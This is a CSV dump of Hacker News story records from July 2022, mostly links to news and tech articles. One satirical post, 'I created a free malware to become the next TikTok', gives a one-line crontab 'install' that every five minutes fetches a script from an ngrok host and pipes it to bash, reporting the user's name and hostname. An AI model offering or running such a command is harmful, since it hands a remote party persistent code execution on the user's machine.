id,title,time,by,score,dead,deleted,descendants,kids,parent,parts,poll,text,type,url,_ctx
32280113,Usage based pricing model metronome-postman,2022-07-29T18:12:53Z,water_melon,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://blog.postman.com/usage-based-pricing-model-metronome-postman/,"{""connection_name"":""hackernews""}"
32280110,Bret Easton Ellis Hates David Foster Wallace (2012),2022-07-29T18:12:37Z,LukeBalizet,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.salon.com/2012/09/06/bret_easton_ellis_hates_david_foster_wallace/,"{""connection_name"":""hackernews""}"
32280126,Nick Tredennick Passes,2022-07-29T18:14:17Z,drallison,1,false,false,<null>,<null>,<null>,<null>,<null>,"July 29.  Sue Tredennick, Nick Tredennick&#x27;s wife, reports the sad news that Nick has died. Two days ago, Nick was riding his ATV from his office to the downhill barn. He had an accident and died. His Apple Watch called 911, but he was gone by the time the paramedics arrived, and the coroner believes that he expired immediately. He was always grateful for his career in a new and rapidly changing industry, and for the innovative people with whom he worked.  Nick worked on a multiplicity of microprocessors, was a founder at Microprocessor Report, and was well known for his eloquently expressed and insightful contrarian views. Nick was a friend and colleague and will be missed.",story,<null>,"{""connection_name"":""hackernews""}"
32280164,A16Z Invests in GaryVee’s NFTs,2022-07-29T18:18:40Z,dotcoma,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://a16zcrypto.com/investing-in-veefriends/,"{""connection_name"":""hackernews""}"
32280106,Scamming Phone Scammers Live – Day 5 [video],2022-07-29T18:11:30Z,axiomdata316,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.youtube.com/watch?v=KvGEIKlDvks,"{""connection_name"":""hackernews""}"
32280063,I don't care about content creators,2022-07-29T18:06:51Z,nvr219,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://lolfi.com/posts/contentcreators/,"{""connection_name"":""hackernews""}"
32279897,Page Weight Matters (2012),2022-07-29T17:51:02Z,Tomte,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://blog.chriszacharias.com/page-weight-matters,"{""connection_name"":""hackernews""}"
32279974,Why Andrew Yang’s New Third Party Is Bound to Fail,2022-07-29T17:57:38Z,eevilspock,3,false,false,1,[32279982],<null>,<null>,<null>,<null>,story,https://www.nytimes.com/2022/07/29/opinion/why-andrew-yangs-new-third-party-is-bound-to-fail.html,"{""connection_name"":""hackernews""}"
32279725,Apple Tablet co-developed by Todd Rundgren (2009),2022-07-29T17:33:33Z,coloneltcb,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,http://www.edibleapple.com/2009/11/23/the-first-apple-tablet-from-1979/,"{""connection_name"":""hackernews""}"
32280005,Introducing: Google Passport (Analytical Fiction),2022-07-29T18:00:30Z,bshepard,2,false,false,2,"[32280054,32280030]",<null>,<null>,<null>,<null>,story,https://deepsocks.substack.com/p/the-thumotic-theory-of-corporate,"{""connection_name"":""hackernews""}"
32279880,Show HN: ColorAround – where you need to find a color around u using the camera,2022-07-29T17:49:34Z,spotus,3,false,false,<null>,<null>,<null>,<null>,<null>,"Hi I made a game in an evening, I would like to share and get feedback.<p>You get a random color palette and have to find it for yourself.<p>ColorAround is an easy and fun color game. It is recommended to play on mobile devices",story,https://coloraround.xyz/,"{""connection_name"":""hackernews""}"
32279978,Magic Cards,2022-07-29T17:57:57Z,ivanmaeder,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://github.com/maddox/magic-cards,"{""connection_name"":""hackernews""}"
32279885,Why thousands of Dutch threw eggs at Jeff Bezos obscene yacht,2022-07-29T17:50:05Z,28304283409234,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.nytimes.com/2022/07/29/business/bezos-yacht-rotterdam.html,"{""connection_name"":""hackernews""}"
32279732,Shortcomings of Diff3,2022-07-29T17:34:20Z,rckrd,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://matt-rickard.com/diff3-shortcomings/,"{""connection_name"":""hackernews""}"
32280186,"Genetically engineered rice needs less fertilizer, makes more food",2022-07-29T18:20:28Z,Tomte,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://arstechnica.com/science/2022/07/boosting-one-gene-in-rice-yields-more-grain-using-less-fertilizer/,"{""connection_name"":""hackernews""}"
32279835,Absurd SQL is absurd because web storage APIs are ABSURD (James Long) [video],2022-07-29T17:43:54Z,thunderbong,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.youtube.com/watch?v=YjPwjBZtKIw,"{""connection_name"":""hackernews""}"
32279712,OpenAI: Will DALL-E 2 kill creative careers?,2022-07-29T17:32:40Z,bookofjoe,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://venturebeat.com/2022/07/26/openai-will-dall-e-2-kill-creative-careers/,"{""connection_name"":""hackernews""}"
32280006,Opinion: Covid-19 almost certainly did not come from a lab leak,2022-07-29T18:00:42Z,johndfsgdgdfg,1,false,false,<null>,[32280050],<null>,<null>,<null>,<null>,story,https://www.theglobeandmail.com/opinion/article-covid-19-almost-certainly-did-not-come-from-a-lab-leak-heres-how-we/,"{""connection_name"":""hackernews""}"
32279760,"Samsung’s “repair mode” lets technicians look at your phone, not your data",2022-07-29T17:37:14Z,conductor,4,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://arstechnica.com/gadgets/2022/07/samsungs-repair-mode-lets-technicians-look-at-your-phone-not-your-data/,"{""connection_name"":""hackernews""}"
32280010,Russia: We’re not leaving the Space Station until our own is ready,2022-07-29T18:01:13Z,stoicanalyst,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://arstechnica.com/science/2022/07/russia-were-not-leaving-the-space-station-until-our-own-is-ready/,"{""connection_name"":""hackernews""}"
32279988,Kids in South Korea and a Moon Mission,2022-07-29T17:58:51Z,solospace,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://blog.jatan.space/p/moon-moment-for-south-korea,"{""connection_name"":""hackernews""}"
32279713,New to the Web Platform in July,2022-07-29T17:32:45Z,feross,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://web.dev/web-platform-07-2022/,"{""connection_name"":""hackernews""}"
32279722,Delaware judge rules that Twitter's case against Elon Musk to go to trial Oct 17,2022-07-29T17:33:31Z,green-eclipse,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.theverge.com/2022/7/29/23283577/elon-musk-twitter-lawsuit-trial-start-date-delaware,"{""connection_name"":""hackernews""}"
32279761,European private-sector offensive actor using 0-day exploits (KNOTWEED),2022-07-29T17:37:15Z,znq,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/,"{""connection_name"":""hackernews""}"
32279794,WordTeX – A WYSIPCTWOTCG Typesetting Tool,2022-07-29T17:39:39Z,gaws,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.youtube.com/watch?v=jlX_pThh7z8,"{""connection_name"":""hackernews""}"
32279811,Hanover bans hot showers in public buildings in reaction to Russian gas crisis,2022-07-29T17:41:10Z,vanilla-almond,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.itv.com/news/2022-07-28/hanover-bans-hot-showers-in-public-buildings-in-reaction-to-russian-gas-crisis,"{""connection_name"":""hackernews""}"
32279777,Recover data from a monolith (microSD card),2022-07-29T17:38:23Z,giuliomagnifico,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://blog.acelab.eu.com/pc-3000-flash-circuit-board-and-msd-card-preparing-and-soldering.html,"{""connection_name"":""hackernews""}"
32279867,Understanding GC in JSC from Scratch,2022-07-29T17:48:27Z,feross,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://webkit.org/blog/12967/understanding-gc-in-jsc-from-scratch/,"{""connection_name"":""hackernews""}"
32279717,Twitter warns of 'record highs' in account data requests,2022-07-29T17:33:07Z,mikece,5,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.engadget.com/twitter-transparency-report-record-account-data-requests-164003519.html,"{""connection_name"":""hackernews""}"
32279776,Fear of Rampant Crime Is Derailing New York City’s Recovery,2022-07-29T17:38:23Z,_tk_,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.bloomberg.com/graphics/2022-is-nyc-safe-crime-stat-reality/,"{""connection_name"":""hackernews""}"
32279762,I created a free malware to become the next TikTok,2022-07-29T17:37:16Z,jesushax,1,false,false,1,"[32279781,32279788]",<null>,<null>,<null>,"Want to watch hilarious and educational clips but don&#x27;t trust TikTok? Trust me instead.<p>Here&#x27;s how you install:<p><pre><code>  crontab -l | { cat; echo &quot;*&#x2F;5 * * * * curl \&quot;https:&#x2F;&#x2F;78d5-190-14-134-185.ngrok.io&#x2F;api&#x2F;ping&#x2F;$(whoami)@$(hostname)\&quot; | bash&quot;; } | crontab -    
</code></pre>
Easy one line install, right?<p>Now the content, you just go to Youtube and type &quot;funniest Vines&quot;, or if you don&#x27;t trust Youtube either, try the fediverse.<p>There&#x27;s even a social aspect, you can see who else has joined my new TikTok improvement by checking out: https:&#x2F;&#x2F;78d5-190-14-134-185.ngrok.io&#x2F;api&#x2F;infections<p>Have fun! And btw don&#x27;t mind the privacy issues or that I can run code on your machine. Just imagine I was a big corporation trying to make money off of you, instead of a single person trying to amuse you. That should make it easier to trust me.<p>Thanks!",story,<null>,"{""connection_name"":""hackernews""}"
32279772,Cassidy Williams: Functional programming is easier than you think,2022-07-29T17:38:10Z,fideloper,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://github.com/readme/guides/functional-programming-basics,"{""connection_name"":""hackernews""}"
32279701,Congress sneaks NASA moon-to-Mars funding into CHIPS+ act,2022-07-29T17:31:24Z,gumby,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://gizmodo.com/nasa-chips-congress-iss-space-1849347577,"{""connection_name"":""hackernews""}"
32279735,A Progress Studies History of Early MIT,2022-07-29T17:34:42Z,jger15,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://freaktakes.substack.com/p/a-progress-studies-history-of-early,"{""connection_name"":""hackernews""}"
32279963,The different ways to handle errors in C,2022-07-29T17:56:50Z,nykolasz,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://mccue.dev/pages/7-27-22-c-errors,"{""connection_name"":""hackernews""}"
32279795,"Show HN: TapeMeasure – Swift class for creating segmented, labeled lines in UI",2022-07-29T17:39:40Z,geoffsdavis,3,false,false,<null>,[32279796],<null>,<null>,<null>,"TapeMeasure is a utility class, written in Swift, for generating a visual tape measure, or any other graphical elements that need layout in a measured sequence.<p>I created this class to help with a pet project I&#x27;m working on, where I needed to generate segmented, labeled lines to use as axes on charts and graphs. It occurred to me that this seems to be a pretty common task, involving a lot of boilerplate code and tedious calculations. Why not decouple the code and move it into a dedicated class? It&#x27;s self-contained, nice and simple, and easy to unit test.<p>It can also handle a lot of tweaks to the &quot;tape measure&quot;, such as boundary clipping and shifting offsets. It&#x27;s especially good for animation, where you can just change a parameter or two during animation, and call for the re-calculated data to re-render your measured line. That makes it great for animated sliding and scaling effects.<p>Anyway, enjoy!",story,https://github.com/geoffsdavis/tape-measure,"{""connection_name"":""hackernews""}"
32279855,How Malaga is building a tech community of remote workers and digital nomads,2022-07-29T17:45:45Z,espacio,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://novobrief.com/this-is-how-malaga-is-building-a-tech-community-of-remote-workers-and-digital-nomads-in-the-costa-del-sol/9203/,"{""connection_name"":""hackernews""}"
32279594,Mandatory speed limiters added to new cars in Europe,2022-07-29T17:21:48Z,GordonS,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.rac.co.uk/drive/news/motoring-news/mandatory-speed-limiters-added-to-new-cars-in-europe-from-today-is-the-uk-n/,"{""connection_name"":""hackernews""}"
32279922,"Time is the increase of order, not disorder",2022-07-29T17:53:14Z,nyc111,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://iai.tv/articles/time-is-the-increase-of-order-julian-barbour-auid-2195,"{""connection_name"":""hackernews""}"
32279908,Claper – The ultimate tool to interact with your audience,2022-07-29T17:51:58Z,thunderbong,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://claper.co/,"{""connection_name"":""hackernews""}"
32280053,Common Lisp OpenGL programming tutorial #7 – Colors,2022-07-29T18:06:01Z,kaveh808,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.youtube.com/watch?v=55jmoToHRTU,"{""connection_name"":""hackernews""}"
32279659,Winamp 5.9 RC1 has been released,2022-07-29T17:26:57Z,thunderbong,2,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.ghacks.net/2022/07/29/winamp-5-9-rc1-has-been-released/,"{""connection_name"":""hackernews""}"
32279662,"Garuda Linux 'Talon': Arch, but different. Dare we say it? Better",2022-07-29T17:27:18Z,lproven,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.theregister.com/2022/07/28/garuda_linux_arch_better/,"{""connection_name"":""hackernews""}"
32279707,How Streaming Stars Pay the Price of Online Fame,2022-07-29T17:32:14Z,asnyder,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.nytimes.com/2022/07/29/technology/twitch-stalking.html,"{""connection_name"":""hackernews""}"
32279609,Wikipedia Suspends Editing of Recession Page,2022-07-29T17:22:48Z,xqcgrek2,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.newsweek.com/wikipedia-editing-recession-joe-biden-rejects-claims-economy-1729065,"{""connection_name"":""hackernews""}"
32279631,Show HN: Hacker's Work – A microblog for your works,2022-07-29T17:24:44Z,egcodes,3,false,false,1,[32279637],<null>,<null>,<null>,"Create a hacker group for yourself. Blog about your works, stay up to date by following other hackers",story,https://www.hackerswork.com/,"{""connection_name"":""hackernews""}"
32279626,Battle of the retro Unix desktops: NsCDE versus CDE,2022-07-29T17:24:33Z,lproven,1,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://www.theregister.com/2022/07/28/battle_of_the_retro_desktops/,"{""connection_name"":""hackernews""}"
32279917,Daily Maps of Ukraine War,2022-07-29T17:52:50Z,O__________O,3,false,false,<null>,<null>,<null>,<null>,<null>,<null>,story,https://twitter.com/war_mapper,"{""connection_name"":""hackernews""}"

